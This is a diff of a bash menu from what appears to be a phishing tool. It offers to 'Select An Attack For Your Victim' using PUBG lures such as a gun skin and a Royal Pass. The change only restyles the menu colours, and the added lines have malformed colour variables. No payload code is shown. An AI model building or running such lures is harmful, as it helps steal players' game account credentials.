@@ -318,9 +318,9 @@ ${RED}[${WHITE}01${RED}]${ORANGE} link Editor
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-${RED} Select An Attack For Your Victim
-${RED}[${WHITE}01${RED}]${ORANGE} Pubg Gun Skin M416
-${RED}[${WHITE}02${RED}]${ORANGE} Pubg Royal Pass 17
+{GREENBG}${RED} Select An Attack For Your Victim ${RESETBG}
+${RED}[${WHITE}01{GREENBG}${BLACK} Pubg Gun Skin M416 ${RESETBG}
+${RED}[${WHITE}02{GREENBG}${BLACK} Pubg Royal Pass 17 ${RESETBG}
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
